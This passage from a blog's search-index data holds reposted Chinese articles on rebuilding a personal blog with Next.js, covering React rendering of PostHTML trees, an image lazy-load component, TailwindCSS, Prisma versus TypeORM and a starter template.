12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394type HtmlTagReplaceReact = &#123; [TagName in keyof JSX.IntrinsicElements]?: keyof JSX.IntrinsicElements | React.ComponentType&lt;ComponentPropsWithoutRef&lt;TagName&gt;&gt;;&#125;;const SINGLE_TAGS = new Set([ &#x27;area&#x27;, &#x27;base&#x27;, &#x27;br&#x27;, &#x27;col&#x27;, &#x27;command&#x27;, &#x27;embed&#x27;, &#x27;hr&#x27;, &#x27;img&#x27;, &#x27;input&#x27;, &#x27;keygen&#x27;, &#x27;link&#x27;, &#x27;menuitem&#x27;, &#x27;meta&#x27;, &#x27;param&#x27;, &#x27;source&#x27;, &#x27;track&#x27;, &#x27;wbr&#x27;]);let totalIndex = 0;const isFalsyNode = (node: PostHTMLNode | PostHTMLNode[]): boolean =&gt; &#123; if ( node == null || node === &#x27;&#x27; || Number.isNaN(node) ) &#123; return true; &#125; return false;&#125;;const posthtmlToReact = (tree: PostHTML.Node[] | PostHTML.Node[][], components: HtmlTagReplaceReact = &#123;&#125;, level = 0): React.ReactNode[] =&gt; &#123; const treeLen = tree.length; if (treeLen === 0) return []; totalIndex = totalIndex + 1; const result: React.ReactNode[] = []; for (let i = 0; i &lt; treeLen; i++) &#123; const node = tree[i]; if (isFalsyNode(node)) &#123; continue; &#125; if (Array.isArray(node)) &#123; if (node.length !== 0) &#123; result.push(...posthtmlToReact(node, components, level + 1)); &#125; continue; &#125; if (typeof node === &#x27;number&#x27; || typeof node === &#x27;string&#x27;) &#123; result.push(node); continue; &#125; if (!Array.isArray(node.content)) &#123; if (isFalsyNode(node.content)) &#123; node.content = []; &#125; else &#123; node.content = [node.content]; &#125; &#125; if (!node.tag) &#123; result.push(...posthtmlToReact(node.content, components, level + 1)); continue; &#125; const tag = typeof node.tag === &#x27;string&#x27; ? node.tag : &#x27;div&#x27;; const compProps = node.attrs ?? &#123;&#125;; const Comp = components[tag] ? components[tag] : tag; const key = `$&#123;totalIndex&#125;-$&#123;i&#125;-$&#123;level&#125;`; if (SINGLE_TAGS.has(tag)) &#123; result.push(&lt;Comp &#123;...compProps&#125; key=&#123;key&#125; /&gt;); result.push(...posthtmlToReact(node.content, components, level + 1)); &#125; else &#123; result.push( &lt;Comp key=&#123;key&#125; &#123;...compProps&#125;&gt;&#123;posthtmlToReact(node.content, components, level + 1)&#125;&lt;/Comp&gt; ); &#125; &#125; return result;&#125;; 将 PostHTML 的 AST 通过 postHtmlToReact 函数转换为 React.ReactNode[] 后，即可直接在 React 组件中使用。调用 postHtmlToReact 时也可以指定某些 HTML 标签的渲染方式、控制文章内容的呈现方式。比如，通过控制 a 标签的渲染方式，我可以将 a 标签渲染为我的 CustomLink 组件、实现内链通过 Next.js 无刷新跳转： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import NextLink from &#x27;next/link&#x27;;const isExternalLink = (href: string) =&gt; &#123; if (!href) &#123; return false; &#125; if (!/^(\\/\\/|http(s)?:)/.test(href)) return false; if (href.startsWith(&#x27;https://blog.skk.moe&#x27;)) &#123; return false; &#125; let urlObj: URL | undefined = undefined; try &#123; urlObj = new URL(href, &#x27;https://blog.skk.moe&#x27;); &#125; catch (e) &#123; &#125; if (typeof urlObj !== &#x27;object&#x27;) return false; if (urlObj.origin === &#x27;null&#x27;) return false; if (urlObj.hostname !== &#x27;blog.skk.moe&#x27;) return true; return false;&#125;;const CustomLink = (props: JSX.IntrinsicElements[&#x27;a&#x27;]) =&gt; &#123; const &#123; href, ...rest &#125; = props; if (isExternalLink(href)) &#123; return ( &lt;a &#123;...props&#125; target=&quot;_blank&quot; rel=&quot;noopener noreferrer external nofollow&quot; /&gt; ); &#125; return ( &lt;NextLink href=&#123;href&#125; passHref&gt; &lt;Link &#123;...rest&#125; /&gt; &lt;/NextLink&gt; );&#125;;export const PostContent = (props: &#123; tree: PostHTML.Node[] &#125;) =&gt; &#123; const tree = Array.isArray(props.tree) ? props.tree : [props.tree]; return posthtmlToReact( tree, &#123; &#x27;a&#x27;: CustomLink, &#125; );&#125;; 再比如，我可以用 CSS-in-JS 为文章内容添加样式： 12345678910111213141516const Blockquote = styled(&#x27;blockquote&#x27;, &#123; borderLeft: &#x27;0.25em solid var(--border)&#x27;, padding: &#x27;1em&#x27;, background: &#x27;var(--c-bg)&#x27;&#125;);export const PostContent = (props: &#123; tree: PostHTML.Node[] &#125;) =&gt; &#123; const tree = Array.isArray(props.tree) ? props.tree : [props.tree]; return posthtmlToReact( tree, &#123; &#x27;blockquote&#x27;: Blockquote, &#125; );&#125;; ※图片 lazyload 优化 两年前，我曾经写过一篇文章「图片 lazyload 的学问和在 Hexo 上的最佳实践」，简单介绍了图片 lazyload 以及与之有关的 Layout Shift 问题，以及占位图、宽高比盒子等概念。两年过去了，图片 lazyload 的策略也在不断进化。 为什么图片需要指定 width 和 height 属性？推荐大家阅读「Setting Height And Width On Images Is Important Again」。在这里 TL, DR 一下： 在比较久远的过去，网络环境并不良好、带宽不足、RTT 和 TTFB 高、丢包率高，加上当时没有合适的 Web 图片编码方式，如果网页不显式提供 元素的长宽，浏览器不得不等到图片全部下载完成后才能获取图片的长宽，从而导致 Reflow 和 Layout Shift。随着移动端和平板电脑的出现，网页设计者希望图片的宽度能填满 viewport 或 container（即响应式图片），一种常见的做法就是 max-width: 100%; height: auto。但是一旦通过 CSS 指定了 max-width 和 height， 元素的 width 和 height 属性便会被浏览器忽略。无法得知图片的长宽，Reflow 和 Layout Shift 问题重新出现。为了避免响应式图片导致的 Reflow 和 Layout Shift，一个 workaround 是将图片包裹在一个 position: relative 的容器中，然后为图片设置 position: absolute、为容器设置一个值为长宽百分比的 padding-bottom，即「宽高比盒子」（Aspect Ratio Boxes）。使用了宽高比盒子后，虽然浏览器在图片加载完以后仍然会 Reflow，但是避免了 Layout Shift。至今 Medium 仍然在使用宽高比盒子避免 Layout Shift。为了一劳永逸的解决这个问题，CSSWG（CSS Working-Group）在「CSS Box Sizing Module Level 4」草案中提出了 aspect-ratio、为块级元素指定宽高比。从 Chrome 79 和 Firefox 71 开始，如果同时为 元素设置了 width 和 height 属性，浏览器会将 width 和 height 用来计算 元素的宽高比（aspect-ratio: attr(width) / attr(height)），既兼容了响应式图片、又避免了 Reflow 和 Layout Shift。 1px 占位图的困局在实现 lazyload 时，一般将真实图片的 URL 放在 data-src 中，并通过 JS 控制 src。但是浏览器并不能很好的处理没有 src 属性的 元素（Undefined Behavior），而将 src 的初始值设置为空字符串又会导致浏览器向页面本身发送一个 GET 请求（参见 RFC3986 中对 URI 为空字符串时的行为规定），常见的解决办法便是将 元素的 src 属性设置为一个 1px 的透明 GIF。 但是 1px 像素的占位图的宽高比例是 1:1，浏览器在渲染 元素时就会设置 1 比 1 的宽高比；当 元素进入 viewport 以后，JS 将 src 设置为图片真实的 URL，此时真实图片的宽高比和 1px 像素占位图的宽高比不相同，便会引发 Reflow 和 Layout Shift。一些大型网站选择采用等比低像素占位图（占位图经过压缩和缩放，只保留原始图片的宽高比），避免真实图片代替占位图后引发宽高比变化。Medium 在使用宽高比盒子的同时，也使用了等比低像素占位图。 最终的解决方案在重构博客的时候，我的图片组件需要解决以下几点问题： 最基础的 Lazyload —— 不加载非关键资源是前端性能优化的铁律，不能违背当图片已经被加载过后，下次加载同一张图片时不再需要 lazyload 由于我的博客不是大型网站、没有专门的图片服务器生成等比低像素占位图、只能使用 1px GIF 占位图规避 Undefined Behavior，因此我的图片组件需要能规避宽高比变化 React DOM 不支持将跨级元素（如 或 ）渲染在 中，这与 Marked.js 的默认行为冲突，因此要么破坏宽高比盒子的 HTML 语义（figure -&gt; img），要么不使用宽高比盒子 1px 透明占位图的 UX 不好、需要为图片组件设置一个 background-color，让用户知道这里存在一个尚未加载的元素（即元素骨架）；但是在图片完全加载成功后，又需要将 backgounrd-color 移除，避免影响透明背景图片、半透明图片的显示效果。首先解决 Lazyload。首先实现一个 use-intersection 的 React Hook。相比 react-use 等现成的实现，我的实现复用了 IntersectionObserver 实例，大幅节省了内存： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165type UseIntersectionObserverInit = Pick&lt;IntersectionObserverInit, &#x27;rootMargin&#x27; | &#x27;root&#x27;&gt;;type UseIntersection = &#123; disabled?: boolean &#125; &amp; UseIntersectionObserverInit &amp; &#123; rootRef?: React.RefObject&lt;HTMLElement&gt; | null &#125;;type ObserveCallback = (isVisible: boolean) =&gt; void;type Identifier = &#123; root: Element | Document | null; margin: string &#125;;type Observer = &#123; id: Identifier observer: IntersectionObserver elements: Map&lt;Element, ObserveCallback&gt;&#125;;const hasIntersectionObserver = typeof IntersectionObserver !== &#x27;undefined&#x27;;export function useIntersection&lt;T extends Element&gt;(&#123; rootRef, rootMargin, disabled&#125;: UseIntersection): [(element: T | null) =&gt; void, boolean, () =&gt; void] &#123; // 通过 isDisabled 控制 useEffect 中副作用是否需要执行 const isDisabled: boolean = disabled || !hasIntersectionObserver; // 通过 Ref 缓存上一次调用 useIntersection 时生成的 unobserve 方法 const unobserve = useRef&lt;() =&gt; void&gt;(); const [visible, setVisible] = useState(false); // 设置 IntersectionObserver 的 root const [root, setRoot] = useState(rootRef ? rootRef.current : null); // React 回调 Ref const setRef = useCallback( (el: T | null) =&gt; &#123; // unobserve 上一次调用 useIntersection 时观察的元素 if (unobserve.current) &#123; unobserve.current(); unobserve.current = undefined; &#125; if (isDisabled || visible) return; // 如果传入的 el 是一个 HTMLElement if (el &amp;&amp; el.tagName) &#123; unobserve.current = observe( el, (isVisible) =&gt; isVisible &amp;&amp; setVisible(isVisible), &#123; root, rootMargin &#125; ); &#125; &#125;, [isDisabled, root, rootMargin, visible] ); useEffect(() =&gt; &#123; if (!hasIntersectionObserver) &#123; // 如果当前 Runtime 没有 IntersectionObserver（如 Node.js 服务端、或浏览器不兼容） // 在 rIC 后显示图片，作为 fallback。rIC 额外引入 Polyfill。 if (!visible) &#123; const idleCallback = requestIdleCallback(() =&gt; setVisible(true)); return () =&gt; cancelIdleCallback(idleCallback); &#125; &#125; &#125;, [visible]); useEffect(() =&gt; &#123; if (rootRef) setRoot(rootRef.current); &#125;, [rootRef]); // 暴露重置 visible 的方法 const resetVisible = useCallback(() =&gt; setVisible(false), []); return [setRef, visible, resetVisible];&#125;// 缓存 IntersectionObserver 实例const observers = new Map&lt;Identifier, Observer&gt;();const idList: Identifier[] = [];function createObserver(options: UseIntersectionObserverInit): Observer &#123; const id = &#123; root: options.root || null, margin: options.rootMargin || &#x27;&#x27; &#125;; const existing = idList.find((obj) =&gt; obj.root === id.root &amp;&amp; obj.margin === id.margin); let instance; // 复用已有的 IntersectionObserver 实例 if (existing) &#123; instance = observers.get(existing); &#125; else &#123; instance = observers.get(id); idList.push(id); &#125; if (instance) return instance; // 记录每个 IntersectionObserver 实例观察的元素，在所有观察的元素都进入 Viewport 后销毁实例 const elements = new Map&lt;Element, ObserveCallback&gt;(); const observer = new IntersectionObserver((entries) =&gt; &#123; entries.forEach((entry) =&gt; &#123; const callback = elements.get(entry.target); const isVisible = entry.isIntersecting || entry.intersectionRatio &gt; 0; if (callback &amp;&amp; isVisible) callback(isVisible); &#125;); &#125;, options); observers.set(id, (instance = &#123; id, observer, elements &#125;)); return instance;&#125;function observe( element: Element, callback: ObserveCallback, options: UseIntersectionObserverInit): () =&gt; void &#123; const &#123; id, observer, elements &#125; = createObserver(options); elements.set(element, callback); observer.observe(element); return function unobserve(): void &#123; elements.delete(element); observer.unobserve(element); // 当没有元素需要观察时，销毁 IntersectionObserver 实例 if (elements.size === 0) &#123; observer.disconnect(); observers.delete(id); const index = idList.findIndex( (obj) =&gt; obj.root === id.root &amp;&amp; obj.margin === id.margin ); if (index &gt; -1) &#123; idList.splice(index, 1); &#125; &#125; &#125;;&#125;接下来实现 &lt;Image /&gt; 组件：export const Image = (props: JSX.IntrinsicElements[&#x27;img&#x27;]) =&gt; &#123; const &#123; src, ...rest &#125; = props; const imageElRef = useRef&lt;HTMLImageElement&gt;(null); const previousSrcRef = useRef&lt;string | undefined&gt;(src); const isLazy = useMemo(() =&gt; &#123; // 至少在 HTML5 spec 中，img 允许没有 src 属性，需要特殊处理 if (!src) return false; if (src?.startsWith(&#x27;data:&#x27;) || src?.startsWith(&#x27;blob:&#x27;)) return false; return true; &#125;, [src]); const [setIntersection, isIntersected, resetIntersected] = useIntersection&lt;HTMLImageElement&gt;(&#123; rootMargin: &#x27;200px&#x27;, disabled: false &#125;); useLayoutEffect(() =&gt; &#123; // 在 React Reconcile 中，同一个 Image 组件可能会被复用、DOM 中的 HTMLImageElement 也会被复用 // 而 useIntersection 中副作用的依赖仅为 HTMLImageElement，因此需要手动重置 visible state if (previousSrcRef.current !== src) &#123; previousSrcRef.current = src; resetIntersected(); &#125; setIntersection(imageElRef.current); &#125;, [resetIntersected, setIntersection, src]); const isVisible = !isLazy || isIntersected; // 由 React 控制显示 1px 占位图还是真实图片 const srcString = isVisible ? src : SMALLEST_GIF; return ( &lt;img &#123;...rest&#125; ref=&#123;imageElRef&#125; decoding=&quot;async&quot; crossOrigin=&quot;anonymous&quot; src=&#123;srcString&#125; /&gt; )&#125;; 接下来解决 1px 占位图的宽高比问题： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&#123;/* 既然 React DOM 不允许在 &lt;p /&gt; 中渲染 &lt;figure /&gt; 或 &lt;div /&gt;，&lt;span /&gt; 总行吧？ */&#125;&lt;span style=&#123;&#123; boxSizing: &#x27;border-box&#x27;, display: &#x27;inline-block&#x27;, position: &#x27;relative&#x27;, maxWidth: &#x27;100%&#x27;, width: &#x27;initial&#x27;, height: &#x27;initial&#x27;, cursor: &#x27;zoom-in&#x27;, margin: &#x27;0 auto 1em&#x27;&#125;&#125;&gt; &lt;span style=&#123;&#123; boxSizing: &#x27;border-box&#x27;, display: &#x27;block&#x27;, width: &#x27;initial&#x27;, height: &#x27;initial&#x27;, maxWidth: &#x27;100%&#x27; &#125;&#125; &gt; &#123;/* 使用一个和原始图片长宽一致的 data URI svg 图片撑起宽高比容器，兼容包括 Safari 在内的、没有原生 aspect-ratio 的浏览器 */&#125; &lt;img style=&#123;&#123; display: &#x27;block&#x27;, backgroundColor: &#x27;none&#x27;, backgroundImage: &#x27;none&#x27;, width: &#x27;initial&#x27;, height: &#x27;initial&#x27;, maxWidth: &#x27;100%&#x27; &#125;&#125; width=&#123;width&#125; height=&#123;height&#125; alt=&quot;&quot; aria-hidden=&#123;true&#125; src=&#123;`data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27$&#123;width&#125;%27%20height=%27$&#123;height&#125;%27/%3e`&#125; /&gt; &lt;/span&gt; &lt;img &#123;...rest&#125; &#123;/* 让图片直接填满由 data URI svg 撑起的容器 */&#125; style=&#123;&#123; boxSizing: &#x27;border-box&#x27;, padding: 0, border: 0, margin: &#x27;auto&#x27;, display: &#x27;block&#x27;, minWidth: &#x27;100%&#x27;, maxWidth: &#x27;100%&#x27;, minHeight: &#x27;100%&#x27;, maxHeight: &#x27;100%&#x27; &#125;&#125; ref=&#123;imageElRef&#125; decoding=&quot;async&quot; crossOrigin=&quot;anonymous&quot; src=&#123;srcString&#125; /&gt;&lt;/span&gt; 由于需要在图片尚未下载、或下载了但尚未解码完成时显示骨架（background-color），需要首先实现一个 useImageFullyLoaded 的 React Hook： 12345678910111213141516171819202122232425262728293031323334353637const LOADED_IMAGE_URLS = new Set&lt;string&gt;[];export const useImageFullyLoaded = (imageElRef: React.RefObject&lt;HTMLImageElement&gt;, srcString?: string) =&gt; &#123; const [isFullyLoaded, setIsFullyLoaded] = useState(false); const handleLoad = useCallback(() =&gt; &#123; if (srcString) &#123; const img = imageElRef.current; if (!img) return; // 真实图片元素当前的 src（currentSrc，当网页用 picture / source 元素指定了变种后，浏览器实际采用的 src） const imgSrc = img.currentSrc || img.src; if (imgSrc &amp;&amp; imgSrc !== SMALLEST_GIF) &#123; // 利用 HTMLImageElement.prototype.decode API，获取图片解码后的回调 // 在不兼容的浏览器上直接等待一个 microtask const promise = &#x27;decode&#x27; in img ? img.decode() : Promise.resolve(); promise.catch(() =&gt; &#123;&#125;).then(() =&gt; &#123; if (!imageElRef.current) return; // 记录已经加载完、解码的图片 LOADED_IMAGE_URLS.add(srcString); setIsFullyLoaded(true); &#125;); &#125; &#125; &#125;, [imageElRef, srcString]); // 由于 SSR 输出了完整 HTML，而页面的 JS 又全部都是异步加载。 // 浏览器可能在 React DOM 还没 Hydration 时就完成了图片的下载，因此不能直接添加 onLoad useEffect(() =&gt; &#123; if (imageElRef.current) &#123; if (imageElRef.current.complete) &#123; handleLoad(); &#125; else &#123; imageElRef.current.onload = handleLoad; &#125; &#125; &#125;, [handleLoad, imageElRef]); return isFullyLoaded;&#125;; 有了 useImageFullyLoaded 和 LOADED_IMAGE_URLS，我们就可以获取图片 是否已经下载过 和 是否解码完成并完整地显示在页面上了： 123456789101112131415161718const isLazy = useMemo(() =&gt; &#123; if (!src) return false; if (src?.startsWith(&#x27;data:&#x27;) || src?.startsWith(&#x27;blob:&#x27;)) return false; if (typeof window !== &#x27;undefined&#x27;) &#123; // 这张图片已经加载过、解码过了，无需 lazyload if (LOADED_IMAGE_URLS.has(src)) return false; &#125; return true;&#125;, [src]);// ...const isImageFullyLoaded = useImageFullyLoaded(imageElRef, src);&#123;/* &lt;img /&gt; 外层的容器 */&#125;&lt;span style=&#123;&#123; // 容器的其它样式 // .... // 只有当图片完全解码、显示在页面上后，才去掉 background-color backgroundColor: isImageFullyLoaded ? undefined : &#x27;#eee&#x27;,&#125;&#125;&gt; 最后再加上前文提到的、模仿 Medium 的点击文中图片放大的效果，完整的 组件就封装好了。 ※尾声 当我一个月前开始动笔写这篇文章的时候，我只是想写一篇流水账，记录我在重构博客时遇到的每个问题、以及解决的办法。但是写着写着，就变成了介绍我最近发现的前端的前沿技术、以及如何在重构我的博客时应用这些技术，以至于最后几乎变成了一篇前端性能优化和 React 的 Newsletter。 重构博客是我突破舒适区的又一次尝试。对博客的每一次打磨，就是抓住机会实践 Web 最前沿的技术和经验；每一次 commit，我都将博客的用户体验和性能推上新的高度。 之前一直有不少人问题，我的博客主题是否开源，我的回答一直是「否」。为了满足这部分人的好奇心，我过去几年间也写过许多关于「前端性能优化」的文章，以及介绍过我过去的博客使用的性能优化方案，如「使 Disqus 不再拖累性能和页面加载」、「天下武功，唯快不破 —— 我是这样优化博客的」和「再快一点，再快一点 —— 优化博客白屏时间的实践」。这一次借着这篇文章，我也分享了部分博客中实际使用的代码、以及我是如何一步一步实现这些特性的，希望能够满足这部分读者的好奇心。 以上。","tags":"nextjs"},{"title":"使用 NextJS 和 TailwindCSS 重构我的博客","url":"/20240711/shi-yong-nextjs-he-tailwindcss-chong-gou-wo-de-bo-ke/","text":"转载自 使用 NextJS 和 TailwindCSS 重构我的博客 git地址 在线地址 这是笔者第三次重构博客，虽然博客应用是最简单的应用，但学习新技术何不从重构博客开始？ 第一版：使用 Hexo 和 Github pages 优点：重新部署只要花5分钟，内容管理在本地 纯静态、免费； 缺点：依赖Github，国内访问困难； 第二版：React + Antd + Mysql 服务器是阿里云 ESC 最低配 优点： 感觉没什么优点； 缺点： 浏览器渲染，搜索引擎无法收录 ESO 优化难，Antd 组件使用方便，但前台页面定制需要覆盖样式； 第三版：NextJS + TailwindCSS + Postgresql 优点： 服务端渲染（SSR）+ 静态生成， 访问速度极快，全新 UI 支持换肤； ※TailwindCSS 在国外如火如荼，但是在国内却很少看到在生产上应用，对我来说， TailwindCSS 不仅仅是一个原子类的超级样式库； 1、我们在写样式的时候，经常会写类名，团队成员之间会存在样式冲突的可能，虽然我们可以使用 css modules 来避免，但却会存在取类名称的疲劳的问题，重复的类名称 -header,-body -container --wrapper等； 2、Utility-First： 默认采用 rem 单位， 变量也就是16 的倍数， px-1是 16 的 1/4 也就是 4 px，我们不会写出13px、17px 等不统一的单位变量，正所谓失之毫厘，差之千里。 配合 VScode 插件， 我们可以根据提示实时看到实际单位数值，写出高度还原高保真的样式； 3、jwt 模式： just-in-time 模式，可以写出在原子类之外的样式，比如: w-[762px]表示width:762px, grid-cols-[1fr,700px,2fr] 表示grid-template-columns: 1fr 700px 2fr; 当然还有h-[calc(1000px-4rem)]等等，这些都是运行时才生成的样式；配合在tailwind.config.js 中加入purge: ['./src/**/*.&#123;js,ts,jsx,tsx&#125;']打包时只会提取使用到的样式，让应用css最小化。 4、之前写了《使用 CSS variables 和Tailwind css实现主题换肤》也运用到了我的博客中。 ※Next.js next.js 是一个 react 服务端渲染框架，相比react单页应用，网络爬虫可以识别 HTML 语义标签，更有利于 SEO。 接下来介绍下 NextJS 主要 API： ※getServerSideProps 服务端渲染 下面是最简单的客户端渲染代码 123456789101112131415161718192021222324import React, &#123; ReactElement, useEffect, useState &#125; from &#x27;react&#x27;import &#123; useParams &#125; from &quot;react-router-dom&quot;;export default function Post(): ReactElement &#123; let &#123; slug &#125; = useParams(); const [post, setPost] = useState(&#123; title:&#x27;&#x27;, content:&#x27;&#x27; &#125;) useEffect(() =&gt; &#123; fetch(`/api/post/$&#123;slug&#125;`).then((res)=&gt;res.json()).then((res)=&gt;&#123; setPost(res) &#125;) &#125;, []) return ( &lt;&gt; &lt;h1&gt;&#123;post.title&#125;&lt;/h1&gt; &lt;div dangerouslySetInnerHTML=&#123;&#123; __html:post.content &#125;&#125;&gt;&lt;/div&gt; &lt;/&gt; )&#125; 改成 NextJS 后的代码如下 12345678910111213141516171819202122232425// pgaes/blog/[slug].tsximport React, &#123; ReactElement &#125; from &#x27;react&#x27;export default function Post(&#123; post &#125;): ReactElement &#123; return ( &lt;&gt; &lt;h1&gt;&#123;post.title&#125;&lt;/h1&gt; &lt;div dangerouslySetInnerHTML=&#123;&#123; __html:post.content &#125;&#125;&gt;&lt;/div&gt; &lt;/&gt; )&#125;export async function getServerSideProps(context) &#123; const &#123; slug &#125;=context.params const res = await fetch(`https://.../api/post/$&#123;slug&#125;`) const post = await res.json() return &#123; props: &#123; post &#125;, &#125;&#125; getServerSideProps 是在node端处理，每个 request 请求时执行。 而文章内容写完之后是通常不变的，所以可以先将页面静态存储在服务器上，这样就可以大大减小数据库压力。 ※getStaticProps 在构建时请求数据。 12345678export async function getStaticProps(context) &#123; // fetch data return &#123; props: &#123; //data &#125;, &#125;&#125; 这样就需要在构建时获取全部文章列表，而博客详情页是一个动态路由，就需要 getStaticPaths 这个API ※getStaticPaths 构建时获取动态路由的数据 123456789export async function async getStaticPaths() &#123; const slugs= await getAllSlugs() return &#123; paths: slugs.map(slug=&gt;(&#123; params:slug &#125;)), fallback: true //or false &#125;;&#125; 当网站构建后，新写的文章也需要生成静态页面，这时就可以将fallback 设置为true， 如果设为false，则在构建之外的文章都将返回404页面。 下面是文章详情页的主体代码 12345678910111213141516171819202122232425262728293031323334353637383940414243// pages/posts/[slug].jsimport &#123; useRouter &#125; from &#x27;next/router&#x27;function Post(&#123; post &#125;) &#123; const router = useRouter() // 如果页面还没静态生成，则先显示下面的loading // 直到 `getStaticProps()`运行完成 if (router.isFallback) &#123; return &lt;div&gt;Loading...&lt;/div&gt; &#125; // Render post...&#125;// 在构建时运行，获取全部文章路径export async function getStaticPaths() &#123; return &#123; // 在打包时值生成 `/posts/1` 和 `/posts/2` 的静态页面 paths: [&#123; params: &#123; id: &#x27;1&#x27; &#125; &#125;, &#123; params: &#123; id: &#x27;2&#x27; &#125; &#125;], // 开启其他页面的静态生成 // For example: `/posts/3` fallback: true, &#125;&#125;// 在构建时运行，根据params中的id 获取文章详情export async function getStaticProps(&#123; params &#125;) &#123; // 如果页面的路由是 /posts/1, 这 params.id 的值就是1 const res = await fetch(`https://.../posts/$&#123;params.id&#125;`) const post = await res.json() // 把数据专递给页面的props return &#123; props: &#123; post &#125;, //当请求进入的时候再次生成文章详情页，比如修改文章重新生成 // 1s 内最多生成1次 revalidate: 1, &#125;&#125;export default Post ※prisma —— 下一代 ORM 框架 Nodejs 框架访问数据库，往往会需要一个ORM 框架来帮我们管理数据层代码，而在 Node.js 社区中，sequelize、TypeORM 等框架都被广泛应用，而 prisma 却是一个新秀。 Prisma 支持 Mysql、Postgresql 和 Sqlite， 访问官网我们可以很容易的上手，也可以快速的从老项目接入 虽然 Prisma 和 TypeORM 解决了类似的问题，但它们的工作方式却大相径庭。 ※与 TypeORM 对比 TypeORM 是一种传统的 ORM，它将表映射到模型类。这些模型类可用于生成 SQL 迁移。然后，模型类的实例在运行时为应用程序的 CRUD 查询提供一个接口。 Prisma 是一种新的 ORM，它缓解了传统 ORM 的许多问题，例如: 模型实例的膨胀、业务与存储逻辑的混合、缺乏类型安全性或由延迟加载引起的不可预测查询。 它使用 Prisma Schema，以声明的方式定义应用程序模型。然后使用 Prisma Migrate 命令， Prisma Schema 会生成 SQL 迁移并根据数据库执行它们。Prisma CRUD 查询由 Prisma Client 提供，这是一个针对 Node.js 和 TypeScript 的轻量级且完全类型安全的数据库客户端。 对比下二者代码 Prisma Schema 123456789101112131415model User &#123; id Int @id @default(autoincrement()) name String? email String @unique posts Post[]&#125;model Post &#123; id Int @id @default(autoincrement()) title String content String? published Boolean @default(false) authorId Int? author User? @relation(fields: [authorId], references: [id])&#125; Schema 是一个描述文件，描述了数据模型直接的关系，再通过prisma generate 生成 typescript 声明文件。 TypeORM Entity 12345678910111213141516171819202122232425262728293031323334353637383940import &#123; Entity, PrimaryGeneratedColumn, Column, OneToMany, ManyToOne &#125; from &#x27;typeorm&#x27;@Entity()export class User &#123; @PrimaryGeneratedColumn() id: number @Column(&#123; nullable: true &#125;) name: string @Column(&#123; unique: true &#125;) email: string @OneToMany( type =&gt; Post, post =&gt; post.author ) posts: Post[]&#125;@Entity()export class Post &#123; @PrimaryGeneratedColumn() id: number @Column() title: string @Column(&#123; nullable: true &#125;) content: string @Column(&#123; default: false &#125;) published: boolean @ManyToOne( type =&gt; User, user =&gt; user.posts ) author: User&#125; Entity 是在运行时，代码通过@Entity()来实现 JavaScript 类的继承。 ※过滤 Prisma 12345const posts = await postRepository.find(&#123; where: &#123; title: &#123; contains: &#x27;Hello World&#x27; &#125;, &#125;,&#125;) TypeORM 12345const posts = await postRepository.find(&#123; where: &#123; title: ILike(&#x27;%Hello World%&#x27;), &#125;,&#125;) ※多对多关系级联操作 Prisma 1234567891011121314151617181920212223242526272829303132333435363738394041424344type Categories=&#123; id?: number name: string createdAt?: Date | null&#125;[]type PostBody = Post &amp; &#123; categories: Categories;&#125;;const &#123; title, summary, slug, content, published, categories &#125; = req.body as PostBody;const connectOrCreate = categories.map((&#123; name &#125;) =&gt; &#123; return &#123; create: &#123; name, &#125;, where: &#123; name, &#125;, &#125;; &#125;); const newPost = await prisma.post.create(&#123; data: &#123; title, summary, slug, content, published, categories: &#123; connectOrCreate, &#125;, user: &#123; connect: &#123; id: req.user.id, &#125;, &#125;, &#125;, include: &#123; categories: true, &#125;, &#125;); 文章和分类是多对多的关系，一篇文章可以有多个分类，一个分类下可以有多篇文章， categories 可以选择已经存在的分类，也可以是新加的分类,通过name唯一熟悉来判断是否要新增还是级联。 TypeORM 1234567891011121314151617181920212223242526@Entity()export class Post &#123; @PrimaryGeneratedColumn() id: number @Column() @IsNotEmpty() title: string @Column(&#123; select: false, type: &#x27;text&#x27;, &#125;) content: string @ManyToMany((type) =&gt; Category, &#123; cascade: true,//级联插入修改 boolean | (&quot;insert&quot; | &quot;update&quot; | &quot;remove&quot; | &quot;soft-remove&quot; | &quot;recover&quot;)[] &#125;) @JoinTable() categories: Category[]&#125;const newPost = postRepository.create(&#123; ...ctx.request.body, &#125;) typeorm 通过cascade 属性 就可以级联增、删、改 软删除 等 ※Postgresql 本次重构还讲数据库迁移到了 Postgresql。 1、MySQL 里有只有 utf8mb4 才能显示 emoji 的坑, Pg 就没这个坑； 2、Pg可以存储 array 和 json， 可以在 array 和 json 上建索引； ※代码编辑器 从上一版是 codemiror 和 remark 自己写的组件 ，这一版发现掘金的 Markdown 编辑比较好用，就直接使用了bytemd, 底层都是使用了 remark 和 rehype，支持任何框架，并且拥有丰富的插件，还是比较好用的，但是在文章详情页却没有单独的 TOC（目录）组件，得单独封装一个TOC组件了。 ※小结 本文主要是笔者记录重构博客所用的知识和记录，当然还有很多不足，也还有很多功能得开发， 比如：图床、评论、SEO优化、 统计和监控等。 当然内容是最重要的，希望以后每周或者每两周能够有一篇文章，记录和总结知识。 喜欢的同学可以fork一下，免费部署到 Heroku 中，Heroku 支持免费的 Postgresql 数据库，也可以将程序部署到 vercel.app/ （国内比较快，不支持数据库），数据库还是选择 Heroku。记得给一个小星✨ ！","tags":"nextjs"},{"title":"使用 Next.js 搭建个人博客","url":"/20240711/shi-yong-next-js-da-jian-ge-ren-bo-ke/","text":"转载自 使用 Next.js 搭建个人博客 现阶段有非常非常多的静态博客生成工具（site generators），Hexo、VuePress、Docusaurus 等等，基本只需把 markdown 文件配置到指定目录，无需编写其他代码即可建站。 本文记录一下使用 next.js 从 0 到 1 搭建一个博客网站的流程。 ※初始化项目 使用 blog-starter-typescript 作为模板创建一个项目 1npx create-next-app my-blog --use-yarn --example &quot;https://github.com/vercel/next.js/tree/canary/examples/blog-starter-typescript&quot; 模版 example 是个大仓库，包含了 next.js 与各种技术集成的样例 模版是简单的 blog 样例，包含读取解析 markdown 文件、加载文章数据、生成首页、生成 blog 文章页面。 用到的 npm 包： gray-matter 处理 yaml front matter remark 解析 markdown，把 markdown 转成 ast 